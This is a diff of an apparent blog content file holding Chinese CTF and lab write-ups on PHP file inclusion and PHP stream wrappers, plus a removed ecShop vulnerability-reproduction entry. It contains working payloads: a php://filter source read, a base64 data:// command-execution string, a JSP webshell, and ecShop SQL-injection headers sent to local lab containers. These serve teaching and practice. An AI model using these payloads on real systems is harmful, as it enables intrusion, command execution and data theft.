+</tr>
+<tr>
+<td>include_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 include() 相同</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>require() 执行如果发生错误，函数会报错并终止脚本</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 require() 相同</td>
+</tr>
+</tbody></table>
+<h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal">on</span>（是否允许 include/require 远程文件）</span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">on</span>（是否允许打开远程文件）</span><br></pre></td></tr></table></figure>
+
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http:&#x2F;&#x2F;</td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>访问各个输入&#x2F;输出流</td>
+</tr>
+<tr>
+<td>phar:&#x2F;&#x2F;</td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>压缩流</td>
+</tr>
+</tbody></table>
+<p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
+<h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>假设一个测试页面该页面存在文件包含漏洞，且网站内部有密码的备份文件，尝试获取密码。在 index.php 页面下有个 file 参数用于接收要包含的文件，设置之为 php:&#x2F;&#x2F;input 伪协议，用 post 传递要执行的 php 代码。系统执行 ls 命令遍历目录，看到当前目录下有 2 个 php 文件。<br><img data-src="https://images.gaifagafin.top/202311051147768.png"><br>显然密码文件不在这里，执行 pwd 命令查看当前的目录，看到这里距离站点根目录还有好几层。<br><img data-src="https://images.gaifagafin.top/202311051147341.png"><br>使用“ls ..”遍历上一级目录，看到一张图片和 2 个网站的目录。<br><img data-src="https://images.gaifagafin.top/202311051147439.png"><br>使用“ls ..&#x2F;..”遍历上一级的上一级目录，看到文件“mima”，此地无银三百两。<br><img data-src="https://images.gaifagafin.top/202311051147878.png"><br>使用 php:&#x2F;&#x2F;filter 伪协议查看该文件，base64 解码后得到想要的东西。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=../../mima</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311051148657.png"><br><img data-src="https://images.gaifagafin.top/202311051148548.png"></p>
+<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,xxxx(base64编码后的数据)</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="例题：bugku-本地包含"><a href="#例题：bugku-本地包含" class="headerlink" title="例题：bugku-本地包含"></a>例题：bugku-本地包含</h1><p>题目的源码如下，观察到代码将提取一个 REQUEST 变量，这个变量时 HTTP Request 变量，默认情况下包含了 GET、POST 和 COOKIE 的数组。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);      <span class="comment">//var_dump() 函数可以输出变量的类型和值</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一种解法是利用 eval() 函数，它把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码且必须以分号结尾。这里 eval() 会把变量 a 中的内容提取出来，然后执行 var_dump() 函数输出。不过由于变量 a 来自于变量 hello 变量，而如果 hello 变量中的内容是代码，也会被执行。所以这里可以传入一句代码来直接显示 flag.php，例如：</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hello</span><span class="operator">=</span>)<span class="comment">;show_source(%27flag.php%27</span></span><br></pre></td></tr></table></figure>
+
+<p>则在 eval 中，就会把上述 hello 的值替换掉变量 a，等同于执行如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>同理，使用其他的函数显示文件也是可以的，注意使用 “);” 来构造。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hello=);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line">hello=);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line">hello=);<span class="keyword">include</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>第二种解法就是用 PHP 伪协议把 flag.php 文件读出来，然后再使用 include() 函数包含出来。<br><img data-src="https://images.gaifagafin.top/202311051151314.png"><br>当然还有第 3 种解法，就是直接把 flag.php 导入到 hello 变量中。</p>
+<h1 id="例题：bugku-flag-在-index-里"><a href="#例题：bugku-flag-在-index-里" class="headerlink" title="例题：bugku-flag 在 index 里"></a>例题：bugku-flag 在 index 里</h1><p>打开网页，点击后观察 url 有个文件包含漏洞，也就是说我们可以想办法把包含 flag 的文件导出来。<br><img data-src="https://images.gaifagafin.top/202311051149193.png"><br>根据提示 flag 在 index.php 里，使用 php 伪协议把文件内容的 base64 编码导出，解码得到 flag。<br><img data-src="https://images.gaifagafin.top/202311051149193.png"></p>
+<h1 id="例题：bugku-welcome-to-bugkuctf"><a href="#例题：bugku-welcome-to-bugkuctf" class="headerlink" title="例题：bugku-welcome to bugkuctf"></a>例题：bugku-welcome to bugkuctf</h1><p>打开网页查看源码如下，源码要求用 GET 方式传递三个参数，其中 user 不为空，并且作为文件名变量打开后的文件内容为 “welcome to the bugkuctf”，file 要求值为 hint.php。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>对于变量 user，当传进去的变量的参数作为文件名变量去打开时，可用 php:&#x2F;&#x2F;input 作为参数，同时使用 post 方式传入内容作为变量的文件内容。对于 file 变量，可以使用伪协议 php:&#x2F;&#x2F;filter 来读取 hint.php 文件。构造出的 payload 为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?txt=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311051149941.png"><br>此时就得到了 hint.php 的源码的 base64 编码，解码后得到：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来的内容关于 PHP 反序列化，可以前往博客<a href="https://www.cnblogs.com/linfangnan/p/13520608.html">CTF-WEB：PHP 反序列化</a>查看剩余步骤。</p>
+<h1 id="例题：攻防世界-Web-php-include"><a href="#例题：攻防世界-Web-php-include" class="headerlink" title="例题：攻防世界-Web_php_include"></a>例题：攻防世界-Web_php_include</h1><p>打开网页，看到一段 PHP 代码如下，观察到这段代码有 include() 函数，因此这题要考虑文件包含漏洞。<strong>strstr() 函数</strong>查找字符串首次出现的位置，然后返回字符串剩余部分。注意到这段代码使用了 strstr() 函数将传入参数中的 “php:&#x2F;&#x2F;” 全部删了，也就是说此处无法直接使用 PHP 伪协议来完成。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到这里还传递了一个参数 “hello”，我们尝试传一个参数进去，发现这个参数被回显回了网页。因此我们考虑以命令执行，然后命令执行的结果回显到浏览器，例如用 ls、cat 命令来查看。<br><img data-src="https://images.gaifagafin.top/202311051150500.png"><br>这里可以改用 data 伪协议来做，首先我们还是要先知道 flag 放在哪里，写出如下代码，则网页就会执行 ls 命令输出目录下的文件名。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据 data 伪协议的使用方法，我们需要把上述代码用 base64 编码然后传入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311051150138.png"><br>接下来就要查看 “fl4gisisish3r3.php” 这个文件的内容了，还是一样写出下面代码让网页执行 cat 命令查看文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还是一样把上述代码用 base64 编码然后传入，然后打开 F12 查看源码就能看到 flag。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQiKT8+</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>文章摘自：<a href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Basics</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+        <tag>伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -1864,81 +1864,6 @@
 
 <p>这里贴出我使用的的木马</p>
 <figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ecShop漏洞复现</title>
-    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="ecShop漏洞复现-2-X-3-X-4-X"><a href="#ecShop漏洞复现-2-X-3-X-4-X" class="headerlink" title="ecShop漏洞复现(2.X,3.X,4.X)"></a>ecShop漏洞复现(2.X,3.X,4.X)</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
-<p>启动docker容器</p>
-<img data-src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
-
-<p>下面是ecshop2.X和3.X对应的端口映射</p>
-<img data-src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
-
-<img data-src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
-
-<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
-<img data-src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
-
-<p>点击下一步</p>
-<img data-src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
-
-<p>继续点击下一步</p>
-<img data-src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
-
-<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
-<img data-src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
-
-<p>安装成功</p>
-<img data-src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
-
-<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
-<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
-<img data-src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
-
-<p>实际上是安装成功了的</p>
-<img data-src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
-<p>根据官方文档的PHP脚本生成POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&quot;-1&#x27; UNION/*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&quot;num&quot;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash2&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash2&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash3&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash3&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>得到POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">2</span>.x: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">3</span>.x: <span class="number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
-
-<p>利用burpsuite抓包将POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5004</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img data-src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
-
-<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img data-src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
-
-<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
-<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
-<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
-<img data-src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
-
-<p>根据参考文档抓包，在包里添加字段</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=collection_list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5003</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>回显界面如下，得到当前数据库用户</p>
-<img data-src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
 
 ]]></content>
       <categories>
@@ -2153,6 +2078,81 @@
       </tags>
   </entry>
   <entry>
+    <title>ecShop漏洞复现</title>
+    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
